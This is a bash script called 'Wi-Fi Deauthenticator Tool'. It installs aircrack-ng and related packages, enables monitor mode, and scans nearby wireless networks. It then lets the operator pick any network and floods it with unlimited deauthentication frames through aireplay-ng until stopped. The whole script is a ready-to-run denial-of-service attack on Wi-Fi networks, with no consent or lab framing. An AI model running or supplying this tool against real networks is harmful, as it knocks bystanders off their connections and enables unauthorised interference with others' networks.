#!/bin/bash

# Function to set colors using tput
set_colors() {
  bold=$(tput bold)
  underline=$(tput smul)
  standout=$(tput smso)
  normal=$(tput sgr0)
  black=$(tput setaf 0)
  red=$(tput setaf 1)
  green=$(tput setaf 2)
  yellow=$(tput setaf 3)
  blue=$(tput setaf 4)
  magenta=$(tput setaf 5)
  cyan=$(tput setaf 6)
  white=$(tput setaf 7)
}

# Function to display the header
display_header() {
  clear
  figlet -c -f slant "Wi-Fi Deauthenticator Tool" | lolcat
}

# Function to list all wireless interfaces
list_wireless_interfaces() {
  interfaces=$(iw dev | grep Interface | awk '{print $2}')
  if [ -z "$interfaces" ]; then
    echo -e "${bold}${red}No wireless interfaces found.${normal}"
    exit 1
  fi
  echo -e "${bold}${green}Available wireless interfaces:${normal}"
  count=0
  for interface in $interfaces; do
    echo -e "${bold}${blue}$count)${normal} ${bold}${cyan}$interface${normal}"
    ((count++))
  done
}

# Function to install necessary packages
install_packages() {
  echo -e "${bold}${green}Checking and installing necessary packages...${normal}"
  packages=("aircrack-ng" "iw" "net-tools" "figlet" "lolcat")

  for package in "${packages[@]}"; do
    if ! dpkg -s $package >/dev/null 2>&1; then
      echo -e "${bold}${yellow}Installing $package...${normal}"
      apt-get install -y $package
    else
      echo -e "${bold}${green}$package is already installed.${normal}"
    fi
  done

  # Install lolcat gem if not already installed
  if ! gem list -i lolcat; then
    echo -e "${bold}${yellow}Installing lolcat...${normal}"
    gem install lolcat
  else
    echo -e "${bold}${green}lolcat is already installed.${normal}"
  fi
}

# Function to validate BSSID
validate_bssid() {
  if [[ ! $BSSID =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo -e "${bold}${red}Invalid BSSID format. Please enter a valid MAC address (e.g., 00:11:22:33:44:55).${normal}"
    exit 1
  fi
}

# Function to kill interfering processes selectively
kill_interfering_processes() {
  echo -e "${bold}${green}Checking for interfering processes...${normal}"
  interfering_procs=$(airmon-ng check | grep 'PID' -A 999 | grep -v 'PID' | awk '{print $1}')
  
  for proc in $interfering_procs; do
    proc_iface=$(cat /proc/$proc/net/dev | grep -vE 'lo|Iface' | awk '{print $1}' | tr -d ':')
    if [[ "$proc_iface" == "$INTERFACE" ]]; then
      echo -e "${bold}${yellow}Killing process $proc for interface $INTERFACE...${normal}"
      kill $proc
    fi
  done
}

# Function to stop interfaces in monitor mode
stop_monitor_mode_interfaces() {
  echo -e "${bold}${green}Stopping interfaces in monitor mode...${normal}"
  monitor_interfaces=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')
  for interface in $monitor_interfaces; do
    echo -e "${bold}${yellow}Stopping monitor mode on $interface...${normal}"
    airmon-ng stop $interface
  done
}

# Function to clean up generated files
cleanup() {
  echo -e "${bold}${yellow}Cleaning up...${normal}"
  rm -f scan_results* filtered_scan_results.csv deauth_log.txt
}

# Function to stop the monitor mode interface and deauth attack
stop_attack() {
  echo -e "${bold}${yellow}Stopping the deauthentication attack...${normal}"
  kill $AIREPLAY_PID
  echo -e "${bold}${yellow}Disabling monitor mode on $MONITOR_INTERFACE...${normal}"
  airmon-ng stop $MONITOR_INTERFACE
  cleanup
  echo -e "${bold}${green}Attack stopped and monitor mode disabled.${normal}"
  exit 0
}

# Function to send deauth packets and display an animation
send_deauth_packets() {
  local bssid=$1
  local monitor_interface=$2
  local frames=(
    "Attacking |" 
    "Attacking /" 
    "Attacking -" 
    "Attacking \\"
  )
  local i=0

  echo -e "${bold}${green}Sending deauthentication packets...${normal}"
  aireplay-ng -0 0 -a $bssid $monitor_interface > deauth_log.txt 2>&1 &

  AIREPLAY_PID=$!

  while kill -0 $AIREPLAY_PID 2>/dev/null; do
    echo -e "${frames[i]}" | lolcat
    sleep 0.1
    tput cuu1  # Move cursor up 1 line
    tput el  # Clear the line
    i=$(( (i + 1) % 4 ))
  done
}

# Initialize colors
set_colors

# Trap CTRL+C (SIGINT) to stop the attack gracefully
trap stop_attack SIGINT

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo -e "${bold}${red}Please run as root${normal}"
  exit
fi

# Install necessary packages
install_packages

# Display header
display_header

# Kill interfering processes
kill_interfering_processes

# Stop interfaces in monitor mode
stop_monitor_mode_interfaces

# List wireless interfaces and let the user pick one
list_wireless_interfaces

read -p "$(echo -e ${bold}${green}"Enter the number corresponding to the interface you want to use:${normal} ")" interface_num

INTERFACE=$(iw dev | grep Interface | awk '{print $2}' | sed -n "$((interface_num+1))p")

if [ -z "$INTERFACE" ]; then
  echo -e "${bold}${red}Invalid selection. Exiting.${normal}"
  exit 1
fi

# Variables
CHANNEL=""          # Channel of the target network
BSSID=""            # BSSID of the target network
MONITOR_INTERFACE=""

# Step 1: Enable monitor mode
echo -e "${bold}${green}Enabling monitor mode on $INTERFACE...${normal}"
airmon-ng start $INTERFACE

# Get the monitor mode interface name (e.g., wlan0mon)
MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')

# Step 2: Scan for networks to get BSSID and channel
echo -e "${bold}${green}Scanning for networks (will stop automatically after 1 minute)...${normal}"
timeout 1m airodump-ng $MONITOR_INTERFACE --output-format csv -w scan_results &
SCAN_PID=$!
wait $SCAN_PID

# Remove duplicate headers and filter out invalid lines
awk 'NR == 1 || !/^BSSID/ {print $0}' scan_results-01.csv | awk 'NF >= 15' > filtered_scan_results.csv

# Display scanned networks and let the user pick one
echo -e "${bold}${green}Available networks:${normal}"
count=0
networks=()
while IFS=, read -r bssid first_seen last_seen channel speed privacy cipher authentication power beacons iv lanip id_length essid key; do
  if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ && $channel -ge 1 && $channel -le 14 ]]; then
    networks+=("$bssid,$channel,$essid")
    echo -e "${bold}${blue}$count)${normal} ${bold}${cyan}$essid ($bssid) on channel $channel${normal}"
    ((count++))
  fi
done < filtered_scan_results.csv

if [ ${#networks[@]} -eq 0 ]; then
  echo -e "${bold}${red}No networks found. Exiting.${normal}"
  airmon-ng stop $MONITOR_INTERFACE
  cleanup
  exit 1
fi

read -p "$(echo -e ${bold}${green}"Enter the number corresponding to the network you want to deauth:${normal} ")" network_num

if [ -z "${networks[$network_num]}" ]; then
  echo -e "${bold}${red}Invalid selection. Exiting.${normal}"
  airmon-ng stop $MONITOR_INTERFACE
  cleanup
  exit 1
fi

IFS=',' read -r BSSID CHANNEL ESSID <<< "${networks[$network_num]}"

# Step 3: Set the channel
echo -e "${bold}${green}Setting the channel to $CHANNEL...${normal}"
iwconfig $MONITOR_INTERFACE channel $CHANNEL

# Step 4: Send deauthentication packets
send_deauth_packets $BSSID $MONITOR_INTERFACE

# Keep the script running to allow the deauth attack to continue
while true; do
  sleep 1
done

